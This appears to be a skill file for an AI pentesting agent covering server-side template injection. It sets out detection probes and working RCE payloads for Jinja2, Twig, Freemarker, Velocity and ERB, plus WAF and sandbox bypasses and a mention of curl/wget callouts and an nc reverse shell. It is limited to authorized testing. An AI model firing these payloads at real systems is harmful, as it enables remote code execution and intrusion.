---
name: s-ssti
description: Unified Server-Side Template Injection skill linking hack-skills methodology with AboutSecurity execution resources.
---

# Unified Server-Side Template Injection

## When To Use

Use for SSTI discovery, template engine fingerprinting, RCE escalation via Jinja2/Twig/Freemarker/Velocity/ERB.

## Source Priority

| Task Type | Primary Source |
|---|---|
| Methodology | hack-skills |
| Execution | AboutSecurity |
| Ctf | AboutSecurity |
| Bug Bounty | hack-skills |
| Resources | AboutSecurity |

## Source Strategy

- Use hack-skills for methodology, scenario classification, domain coverage and deeper playbooks.
- Use AboutSecurity for execution constraints, mandatory rules, payload files, dictionaries, tool YAML configs, CTF and K8s fine-grained resources.
- Do not duplicate upstream content here. Load upstream files when needed.

## Recommended Loading Order

### High-Level Analysis

1. Read matched hack-skills files first unless Source Priority says otherwise.
2. Then read matched AboutSecurity files for constraints and execution details.

### Execution

1. Read matched AboutSecurity skill files first.
2. Check related Tools YAML.
3. Check related Payload/Dic/Doc files.
4. Fall back to hack-skills for scenario variants and methodology.

### Bug Bounty / Authorized Assessment

1. Prefer hack-skills methodology and scenario files.
2. Use AboutSecurity tools/resources for execution support.

## Matched hack-skills Skills

- `../../security-sources/hack-skills/skills/ssti-server-side-template-injection/SKILL.md` — SKILL: Server-Side Template Injection — Expert Attack Playbook
- `../../security-sources/hack-skills/skills/rce-remote-code-execution/SKILL.md` — SKILL: Remote Code Execution — Expert Attack Playbook

## Matched AboutSecurity Skills

- `../../security-sources/AboutSecurity/skills/exploit/web-method/ssti-methodology/SKILL.md` — SSTI 攻击方法论

## Related AboutSecurity Payloads

- `../../security-sources/AboutSecurity/Payload/ssti/_meta.yaml`
- `../../security-sources/AboutSecurity/Payload/ssti/payload.txt`

## Vulnerability Testing Output Template

When you discover a potential SSTI vulnerability and begin active testing, ⛔ **MUST** structure findings using this fixed 4-module output template.

### Module 1: 测试思路 (Testing Approach)
- Describe injection context: user profile field, email template, report parameter, search box, error page
- Classify engine: Jinja2 (Python), Twig (PHP), Freemarker (Java), Velocity (Java), ERB (Ruby), Pug (Node.js), Razor (.NET)
- State decision tree: polyglot probe (`{{7*7}}` / `${7*7}` / `<%= 7*7 %>`) → behavior analysis → engine identification → RCE payload selection
- Expected success indicator: math expression evaluation (49), object introspection output, command execution

### Module 2: 关键技巧 (Key Techniques)
- Polyglot probe first: `{{7*7}}${7*7}<%= 7*7 %>#{7*7}*{7*7}` covers 5 engines simultaneously
- Context escape: if payload is reflected inside JS string, use `' + {{7*7}} + '` or `` `${7*7}` ``
- Blind SSTI: use `{{config.items()}}` (Flask), `{{_self}}` (Twig), `${.now?long}` (Freemarker) for fingerprinting without RCE
- Second-order SSTI: payload stored in profile name → executed in admin panel rendering weeks later

### Module 3: Payload字典 (Payload Dictionary)
- ⛔ Provide minimum 3 payloads organized by engine:
  1. **Polyglot detection**: `{{7*7}}${7*7}<%= 7*7 %>#{7*7}*{7*7}` → any math eval confirms SSTI
  2. **Engine fingerprint**: `{{7*'7'}}` (Jinja2→7777777 / Twig→49), `${7*7}` (Freemarker/Velocity→49), `<%= 7*7 %>` (ERB→49)
  3. **RCE escalation**:
     - Jinja2: `{{''.__class__.__mro__[1].__subclasses__()[X]}}` → find Popen
     - Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
     - Freemarker: `${"freemarker.template.utility.Execute"?new()("id")}`
     - Velocity: `#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) $rt.getRuntime().exec('id')`
     - ERB: `<%= system('id') %>`

### Module 4: 绕过方法 (Bypass Methods)
1. **Input filter bypass**: Unicode normalization, nested braces `{##}`, newlines in expressions
2. **WAF bypass**: URL-encoded payload `%7B%7B7*7%7D%7D`, double encoding, split across parameters
3. **Sandbox escape**: Jinja2 — access `__subclasses__()` chain; Twig — `_self.env` + `registerUndefinedFilterCallback`; Freemarker — `Execute` class if not blacklisted
4. **Blind SSTI → RCE**: use `curl`/`wget` outbound from sandboxed render, `nc` reverse shell, `sleep` for time-based confirmation

## Important Agent Rules

- Do not treat this bridge file as the full knowledge source.
- Always load the matched upstream files needed for the task.
- Preserve and obey upstream mandatory execution rules.
- Avoid unnecessary brute force or destructive testing.
- Only operate in authorized environments.
